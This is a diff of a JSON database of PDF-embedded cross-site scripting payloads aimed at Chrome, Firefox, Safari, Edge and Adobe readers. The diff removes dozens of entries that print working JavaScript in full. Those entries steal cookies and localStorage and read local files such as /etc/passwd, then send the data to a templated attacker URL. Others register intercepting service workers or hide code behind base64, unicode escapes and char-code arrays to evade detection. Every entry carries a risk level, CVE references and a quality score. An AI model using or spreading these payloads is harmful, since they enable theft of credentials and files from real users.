@@ -1,17 +1,15 @@
 {
   "metadata": {
-    "generated_at": "20250730_143801",
+    "generated_at": "20250730_143526",
     "generator_version": "3.0",
     "merge_tool": "merge_json_payloads.py",
-    "total_payloads": 110,
-    "average_quality_score": 45.5,
-    "high_quality_payloads": 33,
+    "total_payloads": 85,
+    "average_quality_score": 36.29,
+    "high_quality_payloads": 13,
     "source_files": [
       "chrome.json",
       "adobe.json",
       "firefox.json",
-      "pdf_payloads_enhanced_20250730_143526.json",
-      "advanced_payloads.json",
       "payload_database_backup.json",
       "edge.json",
       "safari.json"
@@ -35,18 +33,6 @@
         "duplicates": 1,
         "invalid": 1
       },
-      "pdf_payloads_enhanced_20250730_143526.json": {
-        "total": 85,
-        "valid": 23,
-        "duplicates": 62,
-        "invalid": 0
-      },
-      "advanced_payloads.json": {
-        "total": 25,
-        "valid": 25,
-        "duplicates": 0,
-        "invalid": 0
-      },
       "payload_database_backup.json": {
         "total": 45,
         "valid": 0,
@@ -55,139 +41,63 @@
       },
       "edge.json": {
         "total": 12,
-        "valid": 0,
-        "duplicates": 12,
+        "valid": 12,
+        "duplicates": 0,
         "invalid": 0
       },
       "safari.json": {
         "total": 12,
-        "valid": 0,
-        "duplicates": 12,
+        "valid": 11,
+        "duplicates": 1,
         "invalid": 0
       }
     },
     "breakdown": {
       "browsers": {
-        "firefox": 23,
-        "chrome": 38,
-        "safari": 16,
-        "edge": 16,
-        "adobe": 17
+        "chrome": 31,
+        "firefox": 16,
+        "safari": 11,
+        "adobe": 15,
+        "edge": 12
       },
       "categories": {
-        "dom_manipulation": 1,
-        "webassembly_exploitation": 1,
-        "webgl_exploitation": 1,
         "dom_access": 33,
-        "persistence": 1,
-        "event_driven": 1,
-        "broadcast_channel": 1,
-        "web_locks_api": 1,
-        "file_system": 15,
-        "cross_frame_communication": 1,
-        "service_worker_abuse": 1,
-        "intersection_observer": 1,
-        "steganography": 1,
-        "machine_learning_evasion": 1,
-        "network_exfiltration": 6,
-        "timing_attack": 1,
-        "polyglot": 1,
-        "shared_array_buffer": 1,
-        "mutation_observer": 1,
-        "credential_management": 1,
-        "performance_timeline": 1,
+        "file_system": 14,
         "csp_bypass": 4,
-        "sandbox_escape": 4,
-        "command_execution": 3,
-        "anti_forensics": 1,
-        "indexeddb_exploitation": 1,
-        "payment_request_api": 1,
+        "network_exfiltration": 5,
         "webkit_specific": 4,
+        "sandbox_escape": 3,
         "privilege_escalation": 1,
         "api_abuse": 7,
         "webview_exploit": 2,
         "windows_integration": 7,
         "registry_manipulation": 1,
-        "macos_integration": 2
+        "macos_integration": 2,
+        "command_execution": 2
       },
       "risk_levels": {
-        "high": 55,
-        "critical": 19,
-        "medium": 31,
-        "low": 5
+        "high": 46,
+        "medium": 24,
+        "critical": 13,
+        "low": 2
       },
       "detected_techniques": {
-        "dom_manipulation": 25,
-        "postmessage_abuse": 11,
-        "network_exfiltration": 33,
-        "pdf_specific": 31,
-        "dynamic_execution": 26,
-        "file_access": 10
+        "dom_manipulation": 15,
+        "dynamic_execution": 20,
+        "pdf_specific": 8,
+        "postmessage_abuse": 5,
+        "network_exfiltration": 15,
+        "file_access": 9
       }
     },
     "quality_distribution": {
-      "excellent": 22,
-      "good": 25,
+      "excellent": 11,
+      "good": 11,
       "fair": 17,
       "poor": 46
     }
   },
   "payloads": [
-    {
-      "id": "advanced_xss_002",
-      "category": "dom_manipulation",
-      "browser": "firefox",
-      "technique": "firefox_csp_bypass_advanced",
-      "payload": "(function(){var t=this||window||globalThis;try{if(t.parent&&t.parent.postMessage){var d={type:'xss_payload',browser:'firefox',payload:'pdf_executed',timestamp:Date.now(),url:document.URL,cookies:document.cookie||'none'};t.parent.postMessage(JSON.stringify(d),'{url}');}else if(t.top&&t.top.location){t.top.location.href='{url}?firefox_dom='+btoa(navigator.userAgent+'|'+document.referrer);}}catch(e){try{var x=new XMLHttpRequest();x.open('GET','{url}?firefox_xhr='+encodeURIComponent(e.toString())+'&ua='+encodeURIComponent(navigator.userAgent),true);x.send();}catch(e2){app.alert('Firefox CSP bypass failed: '+e2);}}})();",
-      "description": "Firefox PDF.js CSP bypass using postMessage and XMLHttpRequest with JSON data exfiltration",
-      "risk_level": "high",
-      "cve_reference": "CVE-2019-11707, CVE-2021-23961, CVE-2022-28281",
-      "detected_techniques": [
-        "dom_manipulation",
-        "postmessage_abuse",
-        "network_exfiltration",
-        "pdf_specific"
-      ],
-      "quality_score": 95,
-      "payload_length": 622,
-      "last_updated": "2025-07-30T14:38:01.949024"
-    },
-    {
-      "id": "advanced_xss_014",
-      "category": "webassembly_exploitation",
-      "browser": "firefox",
-      "technique": "firefox_wasm_exploitation",
-      "payload": "(function(){try{if(typeof WebAssembly!=='undefined'){var wasmCode=new Uint8Array([0,97,115,109,1,0,0,0,1,7,1,96,0,1,127,3,2,1,0,7,7,1,3,114,117,110,0,0,10,9,1,7,0,65,42,11]);var wasmModule=new WebAssembly.Module(wasmCode);var wasmInstance=new WebAssembly.Instance(wasmModule);var result=wasmInstance.exports.run();var x=new XMLHttpRequest();x.open('POST','{url}',true);x.setRequestHeader('Content-Type','application/json');x.send(JSON.stringify({browser:'firefox',type:'wasm_exploitation',result:result,timestamp:Date.now()}));}else{throw new Error('WebAssembly not supported');}}catch(e){try{eval(atob('dHJ5e25hdmlnYXRvci5zZW5kQmVhY29uKCd7dXJsfT9maXJlZm94X3dhc21fZmFpbGVkPScgKyBlbmNvZGVVUklDb21wb25lbnQoZS50b1N0cmluZygpKSk7fWNhdGNoKGUyKXthcHAuYWxlcnQoJ0ZpcmVmb3ggV2ViQXNzZW1ibHkgZXhwbG9pdGF0aW9uIGZhaWxlZDogJyArIGUyKTt9'));}catch(e2){app.alert('Firefox WebAssembly exploitation failed: '+e2);}}}());",
-      "description": "Firefox WebAssembly exploitation with binary payload execution",
-      "risk_level": "critical",
-      "cve_reference": "CVE-2019-11707, CVE-2021-23961, CVE-2022-28281",
-      "detected_techniques": [
-        "network_exfiltration",
-        "dynamic_execution",
-        "pdf_specific"
-      ],
-      "quality_score": 95,
-      "payload_length": 900,
-      "last_updated": "2025-07-30T14:38:01.949301"
-    },
-    {
-      "id": "advanced_xss_021",
-      "category": "webgl_exploitation",
-      "browser": "firefox",
-      "technique": "firefox_webgl_exploitation",
-      "payload": "(function(){try{var canvas=document.createElement('canvas');var gl=canvas.getContext('webgl')||canvas.getContext('experimental-webgl');if(!gl){throw new Error('WebGL not supported');}var info=gl.getExtension('WEBGL_debug_renderer_info');var vendor=gl.getParameter(info.UNMASKED_VENDOR_WEBGL);var renderer=gl.getParameter(info.UNMASKED_RENDERER_WEBGL);var version=gl.getParameter(gl.VERSION);var data={browser:'firefox',type:'webgl_exploitation',vendor:vendor,renderer:renderer,version:version,timestamp:Date.now()};var x=new XMLHttpRequest();x.open('POST','{url}',true);x.setRequestHeader('Content-Type','application/json');x.send(JSON.stringify(data));}catch(e){try{eval(atob('dHJ5e25hdmlnYXRvci5zZW5kQmVhY29uKCd7dXJsfT9maXJlZm94X3dlYmdsX2ZhaWxlZD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGUudG9TdHJpbmcoKSkpO31jYXRjaChlMil7YXBwLmFsZXJ0KCdGaXJlZm94IFdlYkdMIGV4cGxvaXRhdGlvbiBmYWlsZWQ6ICcgKyBlMik7fQ=='));}catch(e2){app.alert('Firefox WebGL exploitation failed: '+e2);}}}());",
-      "description": "Firefox WebGL exploitation for GPU information disclosure and rendering context abuse",
-      "risk_level": "medium",
-      "cve_reference": "CVE-2019-11707, CVE-2021-23961, CVE-2022-28281",
-      "detected_techniques": [
-        "network_exfiltration",
-        "dynamic_execution",
-        "pdf_specific"
-      ],
-      "quality_score": 95,
-      "payload_length": 964,
-      "last_updated": "2025-07-30T14:38:01.949510"
-    },
     {
       "id": "xss_pdf_0001",
       "category": "dom_access",
@@ -204,7 +114,7 @@
       ],
       "quality_score": 90,
       "payload_length": 348,
-      "last_updated": "2025-07-30T14:38:01.946624"
+      "last_updated": "2025-07-30T14:35:26.933208"
     },
     {
       "id": "xss_pdf_0004",
@@ -221,7 +131,7 @@
       ],
       "quality_score": 90,
       "payload_length": 412,
-      "last_updated": "2025-07-30T14:38:01.946719"
+      "last_updated": "2025-07-30T14:35:26.933268"
     },
     {
       "id": "xss_pdf_0001",
@@ -239,7 +149,7 @@
       ],
       "quality_score": 90,
       "payload_length": 322,
-      "last_updated": "2025-07-30T14:38:01.946821"
+      "last_updated": "2025-07-30T14:35:26.933361"
     },
     {
       "id": "xss_pdf_0001",
@@ -257,7 +167,7 @@
       ],
       "quality_score": 90,
       "payload_length": 460,
-      "last_updated": "2025-07-30T14:38:01.947001"
+      "last_updated": "2025-07-30T14:35:26.933573"
     },
     {
       "id": "xss_pdf_0004",
@@ -274,7 +184,7 @@
       ],
       "quality_score": 90,
       "payload_length": 516,
-      "last_updated": "2025-07-30T14:38:01.947039"
+      "last_updated": "2025-07-30T14:35:26.933612"
     },
     {
       "id": "xss_pdf_0001",
@@ -292,7 +202,7 @@
       ],
       "quality_score": 90,
       "payload_length": 441,
-      "last_updated": "2025-07-30T14:38:01.947069"
+      "last_updated": "2025-07-30T14:35:26.933641"
     },
     {
       "id": "xss_pdf_0004",
@@ -309,7 +219,7 @@
       ],
       "quality_score": 90,
       "payload_length": 497,
-      "last_updated": "2025-07-30T14:38:01.947103"
+      "last_updated": "2025-07-30T14:35:26.933699"
     },
     {
       "id": "xss_pdf_0001",
@@ -326,82 +236,7 @@
       ],
       "quality_score": 90,
       "payload_length": 418,
-      "last_updated": "2025-07-30T14:38:01.947648"
-    },
-    {
-      "id": "advanced_xss_006",
-      "category": "persistence",
-      "browser": "chrome",
-      "technique": "chrome_storage_persistence",
-      "payload": "(function(){try{var key='pdf_xss_persist';var payload='{url}?persistent=true&t='+Date.now();if(typeof localStorage!=='undefined'){localStorage.setItem(key,payload);}if(typeof sessionStorage!=='undefined'){sessionStorage.setItem(key,payload);}if(window.parent&&window.parent.localStorage){window.parent.localStorage.setItem(key,payload);}var img=new Image();img.src='{url}?chrome_persist=success&storage='+(localStorage?'1':'0');setTimeout(function(){if(localStorage&&localStorage.getItem(key)){var x=new XMLHttpRequest();x.open('GET',localStorage.getItem(key)+'&verified=true',true);x.send();}},1000);}catch(e){app.alert('Chrome persistence failed: '+e);}}());",
-      "description": "Chrome persistent XSS using localStorage and sessionStorage with verification",
-      "risk_level": "high",
-      "cve_reference": "CVE-2019-5786, CVE-2020-6418",
-      "detected_techniques": [
-        "dom_manipulation",
-        "network_exfiltration",
-        "pdf_specific"
-      ],
-      "quality_score": 90,
-      "payload_length": 660,
-      "last_updated": "2025-07-30T14:38:01.949111"
-    },
-    {
-      "id": "advanced_xss_010",
-      "category": "event_driven",
-      "browser": "firefox",
-      "technique": "firefox_event_driven_execution",
-      "payload": "(function(){var events=['click','mouseover','focus','load','error'];var eventFired=false;function executePayload(){if(eventFired)return;eventFired=true;try{var data={browser:'firefox',event:'triggered',timestamp:Date.now(),url:location.href};if(window.parent&&window.parent.postMessage){window.parent.postMessage(JSON.stringify(data),'{url}');}else{var x=new XMLHttpRequest();x.open('POST','{url}',true);x.setRequestHeader('Content-Type','application/json');x.send(JSON.stringify(data));}}catch(e){app.alert('Firefox event-driven execution failed: '+e);}}for(var i=0;i<events.length;i++){document.addEventListener(events[i],executePayload,true);}setTimeout(executePayload,2000);})();",
-      "description": "Firefox event-driven execution with multiple trigger mechanisms",
-      "risk_level": "medium",
-      "cve_reference": "CVE-2019-11707, CVE-2021-23961",
-      "detected_techniques": [
-        "dom_manipulation",
-        "postmessage_abuse",
-        "network_exfiltration",
-        "pdf_specific"
-      ],
-      "quality_score": 90,
-      "payload_length": 683,
-      "last_updated": "2025-07-30T14:38:01.949202"
-    },
-    {
-      "id": "advanced_xss_017",
-      "category": "broadcast_channel",
-      "browser": "firefox",
-      "technique": "firefox_broadcast_channel",
-      "payload": "(function(){try{if(typeof BroadcastChannel!=='undefined'){var bc=new BroadcastChannel('xss_channel');bc.onmessage=function(e){try{var x=new XMLHttpRequest();x.open('POST','{url}',true);x.setRequestHeader('Content-Type','application/json');x.send(JSON.stringify({browser:'firefox',type:'broadcast_channel_response',data:e.data,timestamp:Date.now()}));}catch(err){}};bc.postMessage({type:'xss_broadcast',browser:'firefox',payload:'broadcast_channel_executed',timestamp:Date.now()});setTimeout(function(){bc.close();},5000);}else{throw new Error('BroadcastChannel not supported');}}catch(e){try{parent.postMessage(JSON.stringify({browser:'firefox',type:'broadcast_channel_failed',error:e.toString()}),'{url}');}catch(e2){app.alert('Firefox BroadcastChannel exploitation failed: '+e2);}}}());",
-      "description": "Firefox BroadcastChannel exploitation for cross-tab communication",
-      "risk_level": "medium",
-      "cve_reference": "CVE-2019-11707, CVE-2021-23961",
-      "detected_techniques": [
-        "dom_manipulation",
-        "postmessage_abuse",
-        "network_exfiltration",
-        "pdf_specific"
-      ],
-      "quality_score": 90,
-      "payload_length": 788,
-      "last_updated": "2025-07-30T14:38:01.949387"
-    },
-    {
-      "id": "advanced_xss_025",
-      "category": "web_locks_api",
-      "browser": "firefox",
-      "technique": "firefox_web_locks_api",
-      "payload": "(function(){try{if(typeof navigator.locks!=='undefined'){navigator.locks.request('xss_lock',function(lock){var data={browser:'firefox',type:'web_locks_api',lockName:lock.name,timestamp:Date.now()};var x=new XMLHttpRequest();x.open('POST','{url}',true);x.setRequestHeader('Content-Type','application/json');x.send(JSON.stringify(data));return new Promise(function(resolve){setTimeout(resolve,1000);});}).catch(function(e){throw e;});}else{throw new Error('Web Locks API not supported');}}catch(e){try{parent.postMessage(JSON.stringify({browser:'firefox',type:'web_locks_failed',error:e.toString()}),'{url}');}catch(e2){app.alert('Firefox Web Locks API exploitation failed: '+e2);}}}());",
-      "description": "Firefox Web Locks API exploitation for resource locking and coordination abuse",
-      "risk_level": "low",
-      "cve_reference": "CVE-2019-11707, CVE-2021-23961",
-      "detected_techniques": [
-        "dom_manipulation",
-        "postmessage_abuse",
-        "network_exfiltration",
-        "pdf_specific"
-      ],
-      "quality_score": 90,
-      "payload_length": 685,
-      "last_updated": "2025-07-30T14:38:01.949622"
+      "last_updated": "2025-07-30T14:35:26.934258"
     },
     {
       "id": "xss_pdf_0007",
@@ -417,7 +252,7 @@
       ],
       "quality_score": 80,
       "payload_length": 355,
-      "last_updated": "2025-07-30T14:38:01.946767"
+      "last_updated": "2025-07-30T14:35:26.933308"
     },
     {
       "id": "xss_pdf_0010",
@@ -433,7 +268,7 @@
       ],
       "quality_score": 80,
       "payload_length": 357,
-      "last_updated": "2025-07-30T14:38:01.946802"
+      "last_updated": "2025-07-30T14:35:26.933342"
     },
     {
       "id": "xss_pdf_0002",
@@ -450,112 +285,7 @@
       ],
       "quality_score": 80,
       "payload_length": 139,
-      "last_updated": "2025-07-30T14:38:01.947684"
-    },
-    {
-      "id": "advanced_xss_003",
-      "category": "file_system",
-      "browser": "safari",
-      "technique": "safari_webkit_file_access",
-      "payload": "(function(){var fs=['{sensitive_file}','file:///etc/passwd','file:///System/Library/CoreServices/SystemVersion.plist'];try{for(var i=0;i<fs.length;i++){try{var f=new XMLHttpRequest();f.open('GET',fs[i],false);f.send();if(f.responseText){var x=new XMLHttpRequest();x.open('POST','{url}',true);x.setRequestHeader('Content-Type','application/json');x.send(JSON.stringify({file:fs[i],content:btoa(f.responseText),browser:'safari'}));break;}}catch(e){continue;}}}catch(e){try{window.open('{directory}','_blank');}catch(e2){app.alert('Safari file access blocked: '+e2);}}})();",
-      "description": "Safari PDFKit file system access with content exfiltration via XHR POST",
-      "risk_level": "critical",
-      "cve_reference": "CVE-2019-8625, CVE-2020-3899, CVE-2021-30661",
-      "detected_techniques": [
-        "network_exfiltration",
-        "file_access",
-        "pdf_specific"
-      ],
-      "quality_score": 80,
-      "payload_length": 570,
-      "last_updated": "2025-07-30T14:38:01.949047"
-    },
-    {
-      "id": "advanced_xss_013",
-      "category": "cross_frame_communication",
-      "browser": "chrome",
-      "technique": "chrome_cross_frame_communication",
-      "payload": "(function(){try{var frames=[];try{frames.push(parent);}catch(e){}try{frames.push(top);}catch(e){}try{for(var i=0;i<10;i++){frames.push(window.frames[i]);}}catch(e){}for(var f=0;f<frames.length;f++){try{if(frames[f]&&frames[f].postMessage){var message={type:'xss_communication',browser:'chrome',frameIndex:f,timestamp:Date.now(),payload:'cross_frame_executed'};frames[f].postMessage(JSON.stringify(message),'{url}');}}catch(e){continue;}}var channel=new MessageChannel();channel.port1.onmessage=function(e){try{var response=new XMLHttpRequest();response.open('POST','{url}',true);response.send('chrome_cross_frame_response='+encodeURIComponent(e.data));}catch(err){}};try{parent.postMessage('chrome_channel_init','{url}',[channel.port2]);}catch(e){}}catch(e){app.alert('Chrome cross-frame communication failed: '+e);}}());",
-      "description": "Chrome cross-frame communication using MessageChannel and postMessage vectors",
-      "risk_level": "high",
-      "cve_reference": "CVE-2019-5786, CVE-2020-6418, CVE-2021-21166",
-      "detected_techniques": [
-        "dom_manipulation",
-        "postmessage_abuse",
-        "network_exfiltration",
-        "pdf_specific"
-      ],
-      "quality_score": 80,
-      "payload_length": 821,
-      "last_updated": "2025-07-30T14:38:01.949274"
-    },
-    {
-      "id": "advanced_xss_015",
-      "category": "service_worker_abuse",
-      "browser": "safari",
-      "technique": "safari_service_worker_abuse",
-      "payload": "(function(){try{if('serviceWorker' in navigator){var swCode='self.addEventListener(\"fetch\",function(e){if(e.request.url.includes(\"evil\")){e.respondWith(fetch(\"{url}?safari_sw_intercept=\"+encodeURIComponent(e.request.url)));}});';var blob=new Blob([swCode],{type:'application/javascript'});var swUrl=URL.createObjectURL(blob);navigator.serviceWorker.register(swUrl).then(function(reg){var x=new XMLHttpRequest();x.open('GET','{url}?safari_sw_registered=true&scope='+encodeURIComponent(reg.scope),true);x.send();}).catch(function(e){throw e;});}else{throw new Error('Service Workers not supported');}}catch(e){try{var fallback=new XMLHttpRequest();fallback.open('POST','{url}',true);fallback.setRequestHeader('Content-Type','application/json');fallback.send(JSON.stringify({browser:'safari',type:'service_worker_abuse_failed',error:e.toString(),timestamp:Date.now()}));}catch(e2){app.alert('Safari Service Worker abuse failed: '+e2);}}}());",
-      "description": "Safari Service Worker abuse for request interception and manipulation",
-      "risk_level": "high",
-      "cve_reference": "CVE-2019-8625, CVE-2020-3899, CVE-2021-30661",
-      "detected_techniques": [
-        "network_exfiltration",
-        "pdf_specific"
-      ],
-      "quality_score": 80,
-      "payload_length": 938,
-      "last_updated": "2025-07-30T14:38:01.949332"
-    },
-    {
-      "id": "advanced_xss_018",
-      "category": "intersection_observer",
-      "browser": "edge",
-      "technique": "edge_intersection_observer",
-      "payload": "(function(){try{if(typeof IntersectionObserver!=='undefined'){var target=document.createElement('div');target.style.position='absolute';target.style.top='0px';target.style.left='0px';target.style.width='1px';target.style.height='1px';document.body.appendChild(target);var observer=new IntersectionObserver(function(entries){entries.forEach(function(entry){if(entry.isIntersecting){var x=new XMLHttpRequest();x.open('GET','{url}?edge_intersection_observer=triggered&time='+Date.now(),true);x.send();observer.disconnect();}});},{threshold:0});observer.observe(target);}else{throw new Error('IntersectionObserver not supported');}}catch(e){try{window.open('{url}?edge_intersection_failed='+encodeURIComponent(e.toString()),'_blank');}catch(e2){app.alert('Edge IntersectionObserver exploitation failed: '+e2);}}}());",
-      "description": "Microsoft Edge IntersectionObserver exploitation for visibility-based triggering",
-      "risk_level": "low",
-      "cve_reference": "CVE-2020-0674, CVE-2021-26411",
-      "detected_techniques": [
-        "dom_manipulation",
-        "network_exfiltration",
-        "pdf_specific"
-      ],
-      "quality_score": 80,
-      "payload_length": 812,
-      "last_updated": "2025-07-30T14:38:01.949414"
-    },
-    {
-      "id": "advanced_xss_007",
-      "category": "steganography",
-      "browser": "firefox",
-      "technique": "firefox_steganographic_payload",
-      "payload": "(function(){var h='\\u0066\\u0075\\u006e\\u0063\\u0074\\u0069\\u006f\\u006e\\u0020\\u0065\\u0078\\u0066\\u0069\\u006c\\u0028\\u0029\\u007b\\u0076\\u0061\\u0072\\u0020\\u0064\\u003d\\u006e\\u0065\\u0077\\u0020\\u0044\\u0061\\u0074\\u0065\\u0028\\u0029\\u002e\\u0074\\u006f\\u0049\\u0053\\u004f\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067\\u0028\\u0029\\u003b\\u0076\\u0061\\u0072\\u0020\\u0075\\u003d\\u006e\\u0061\\u0076\\u0069\\u0067\\u0061\\u0074\\u006f\\u0072\\u002e\\u0075\\u0073\\u0065\\u0072\\u0041\\u0067\\u0065\\u006e\\u0074\\u003b\\u0076\\u0061\\u0072\\u0020\\u0078\\u003d\\u006e\\u0065\\u0077\\u0020\\u0058\\u004d\\u004c\\u0048\\u0074\\u0074\\u0070\\u0052\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074\\u0028\\u0029\\u003b\\u0078\\u002e\\u006f\\u0070\\u0065\\u006e\\u0028\\u0027\\u0050\\u004f\\u0053\\u0054\\u0027\\u002c\\u0027{url}\\u0027\\u002c\\u0074\\u0072\\u0075\\u0065\\u0029\\u003b\\u0078\\u002e\\u0073\\u0065\\u006e\\u0064\\u0028\\u004a\\u0053\\u004f\\u004e\\u002e\\u0073\\u0074\\u0072\\u0069\\u006e\\u0067\\u0069\\u0066\\u0079\\u0028\\u007b\\u0074\\u0069\\u006d\\u0065\\u003a\\u0064\\u002c\\u0075\\u0061\\u003a\\u0075\\u002c\\u0062\\u0072\\u006f\\u0077\\u0073\\u0065\\u0072\\u003a\\u0027\\u0066\\u0069\\u0072\\u0065\\u0066\\u006f\\u0078\\u0027\\u007d\\u0029\\u0029\\u003b\\u007d';try{eval(h);exfil();}catch(e){var b=atob('dHJ5e25hdmlnYXRvci5zZW5kQmVhY29uKCd7dXJsfT9zdGVnYW5vPWZhaWxlZCcpO31jYXRjaChlMil7YXBwLmFsZXJ0KCdGaXJlZm94IHN0ZWdhbm9ncmFwaGljIGZhaWxlZDogJytlMik7fQ==');eval(b);}}());",
-      "description": "Firefox steganographic payload using Unicode escaping and base64 encoding layers",
-      "risk_level": "high",
-      "cve_reference": "CVE-2019-11707, CVE-2021-23961",
-      "detected_techniques": [
-        "dynamic_execution"
-      ],
-      "quality_score": 75,
-      "payload_length": 1319,
-      "last_updated": "2025-07-30T14:38:01.949144"
-    },
-    {
-      "id": "advanced_xss_012",
-      "category": "machine_learning_evasion",
-      "browser": "edge",
-      "technique": "edge_ml_evasion",
-      "payload": "(function(){var chars=[32,40,102,117,110,99,116,105,111,110,40,41,123,118,97,114,32,120,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,40,41,59,120,46,111,112,101,110,40,39,71,69,84,39,44,39,123,117,114,108,125,63,101,100,103,101,95,109,108,95,101,118,97,115,105,111,110,61,39,43,68,97,116,101,46,110,111,119,40,41,44,116,114,117,101,41,59,120,46,115,101,110,100,40,41,59,125,41,40,41,59];var payload='';for(var i=0;i<chars.length;i++){payload+=String.fromCharCode(chars[i]);}try{var func=new Function(payload);setTimeout(func,Math.random()*1000+500);}catch(e){try{window.open('{url}?edge_ml_evasion_failed='+encodeURIComponent(e.toString()),'_blank');}catch(e2){app.alert('Edge ML evasion failed: '+e2);}}}());",
-      "description": "Microsoft Edge machine learning evasion using dynamic character array reconstruction",
-      "risk_level": "medium",
-      "cve_reference": "CVE-2020-0674, CVE-2021-26411",
-      "detected_techniques": [
-        "dynamic_execution",
-        "pdf_specific"
-      ],
-      "quality_score": 75,
-      "payload_length": 733,
-      "last_updated": "2025-07-30T14:38:01.949250"
+      "last_updated": "2025-07-30T14:35:26.934274"
     },
     {
       "id": "chrome_003",
@@ -571,7 +301,7 @@
       ],
       "quality_score": 70,
       "payload_length": 148,
-      "last_updated": "2025-07-30T14:38:01.947151"
+      "last_updated": "2025-07-30T14:35:26.933767"
     },
     {
       "id": "firefox_011",
@@ -587,127 +317,7 @@
       ],
       "quality_score": 70,
       "payload_length": 120,
-      "last_updated": "2025-07-30T14:38:01.947823"
-    },
-    {
-      "id": "advanced_xss_005",
-      "category": "network_exfiltration",
-      "browser": "edge",
-      "technique": "edge_fetch_api_exfiltration",
-      "payload": "(function(){var data={browser:'edge',timestamp:new Date().toISOString(),url:location.href,userAgent:navigator.userAgent,platform:navigator.platform,cookies:document.cookie||'none',localStorage:JSON.stringify(localStorage)||'none'};try{if(typeof fetch!=='undefined'){fetch('{url}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)}).catch(function(e){console.log('Fetch failed:',e);});}else{var x=new XMLHttpRequest();x.open('POST','{url}',true);x.setRequestHeader('Content-Type','application/json');x.send(JSON.stringify(data));}}catch(e){try{navigator.sendBeacon('{url}?edge_beacon='+encodeURIComponent(JSON.stringify(data)));}catch(e2){app.alert('Edge network exfiltration failed: '+e2);}}}());",
-      "description": "Microsoft Edge data exfiltration using Fetch API with sendBeacon fallback",
-      "risk_level": "high",
-      "cve_reference": "CVE-2020-0674, CVE-2021-26411, CVE-2022-21974",
-      "detected_techniques": [
-        "network_exfiltration",
-        "pdf_specific"
-      ],
-      "quality_score": 70,
-      "payload_length": 731,
-      "last_updated": "2025-07-30T14:38:01.949090"
-    },
-    {
-      "id": "advanced_xss_008",
-      "category": "timing_attack",
-      "browser": "safari",
-      "technique": "safari_timing_based_bypass",
-      "payload": "(function(){var start=performance.now();var attempts=0;var maxAttempts=5;function timeBasedEvasion(){attempts++;try{if(typeof parent!=='undefined'&&parent.window){var timeDiff=performance.now()-start;if(timeDiff>100){parent.window.location.href='{url}?safari_timing='+(timeDiff)+'&attempt='+attempts;}else{setTimeout(timeBasedEvasion,50+Math.random()*100);}}}catch(e){if(attempts<maxAttempts){setTimeout(timeBasedEvasion,200+Math.random()*300);}else{try{window.open('{url}?safari_timing_final=failed&attempts='+attempts,'_blank');}catch(e2){app.alert('Safari timing attack exhausted: '+e2);}}}}timeBasedEvasion();})();",
-      "description": "Safari timing-based evasion with performance monitoring and adaptive delays",
-      "risk_level": "medium",
-      "cve_reference": "CVE-2019-8625, CVE-2020-3899",
-      "detected_techniques": [
-        "dom_manipulation",
-        "pdf_specific"
-      ],
-      "quality_score": 70,
-      "payload_length": 618,
-      "last_updated": "2025-07-30T14:38:01.949165"
-    },
-    {
-      "id": "advanced_xss_009",
-      "category": "polyglot",
-      "browser": "chrome",
-      "technique": "chrome_polyglot_payload",
-      "payload": "/*<script>*/try{var/*</script><img src=x onerror=*/p=parent||top;if(p){p.location='/*'>*/{url}?polyglot=chrome&payload=*/'+btoa('chrome_polyglot_executed')/*'+'&time='+Date.now()*/;}/*</img>*/}catch(e){/*<svg onload=*/app.alert('Polyglot failed: '+e)/*>*/;}/*</svg>*//*</script>*/",
-      "description": "Chrome polyglot payload combining JavaScript, HTML, and SVG vectors",
-      "risk_level": "high",
-      "cve_reference": "CVE-2019-5786, CVE-2020-6418",
-      "detected_techniques": [
-        "dom_manipulation",
-        "pdf_specific"
-      ],
-      "quality_score": 70,
-      "payload_length": 280,
-      "last_updated": "2025-07-30T14:38:01.949180"
-    },
-    {
-      "id": "advanced_xss_016",
-      "category": "shared_array_buffer",
-      "browser": "chrome",
-      "technique": "chrome_shared_array_buffer",
-      "payload": "(function(){try{if(typeof SharedArrayBuffer!=='undefined'){var sab=new SharedArrayBuffer(1024);var view=new Uint8Array(sab);var payload='chrome_shared_array_buffer_exploitation';for(var i=0;i<payload.length;i++){view[i]=payload.charCodeAt(i);}var worker=new Worker(URL.createObjectURL(new Blob(['var sab=new SharedArrayBuffer(1024);var view=new Uint8Array(sab);postMessage(\"worker_ready\");onmessage=function(e){if(e.data instanceof SharedArrayBuffer){var view=new Uint8Array(e.data);var str=\"\";for(var i=0;i<view.length&&view[i]!==0;i++){str+=String.fromCharCode(view[i]);}fetch(\"{url}?chrome_sab=\"+encodeURIComponent(str));}}'],{type:'application/javascript'})));worker.postMessage(sab);}else{throw new Error('SharedArrayBuffer not available');}}catch(e){try{var x=new XMLHttpRequest();x.open('GET','{url}?chrome_sab_failed='+encodeURIComponent(e.toString()),true);x.send();}catch(e2){app.alert('Chrome SharedArrayBuffer exploitation failed: '+e2);}}}());",
-      "description": "Chrome SharedArrayBuffer exploitation with Web Worker communication",
-      "risk_level": "critical",
-      "cve_reference": "CVE-2019-5786, CVE-2020-6418, CVE-2021-21166",
-      "detected_techniques": [
-        "postmessage_abuse",
-        "network_exfiltration",
-        "pdf_specific"
-      ],
-      "quality_score": 70,
-      "payload_length": 956,
-      "last_updated": "2025-07-30T14:38:01.949364"
-    },
-    {
-      "id": "advanced_xss_019",
-      "category": "mutation_observer",
-      "browser": "safari",
-      "technique": "safari_mutation_observer",
-      "payload": "(function(){try{if(typeof MutationObserver!=='undefined'){var observer=new MutationObserver(function(mutations){mutations.forEach(function(mutation){if(mutation.type==='childList'&&mutation.addedNodes.length>0){var x=new XMLHttpRequest();x.open('POST','{url}',true);x.setRequestHeader('Content-Type','application/json');x.send(JSON.stringify({browser:'safari',type:'mutation_observer',mutationType:mutation.type,addedNodes:mutation.addedNodes.length,timestamp:Date.now()}));observer.disconnect();}});});observer.observe(document.body,{childList:true,subtree:true});var trigger=document.createElement('span');trigger.textContent='xss_trigger';document.body.appendChild(trigger);}else{throw new Error('MutationObserver not supported');}}catch(e){try{navigator.sendBeacon('{url}?safari_mutation_failed='+encodeURIComponent(e.toString()));}catch(e2){app.alert('Safari MutationObserver exploitation failed: '+e2);}}}());",
-      "description": "Safari MutationObserver exploitation for DOM change detection and triggering",
-      "risk_level": "medium",
-      "cve_reference": "CVE-2019-8625, CVE-2020-3899",
-      "detected_techniques": [
-        "network_exfiltration",
-        "pdf_specific"
-      ],
-      "quality_score": 70,
-      "payload_length": 915,
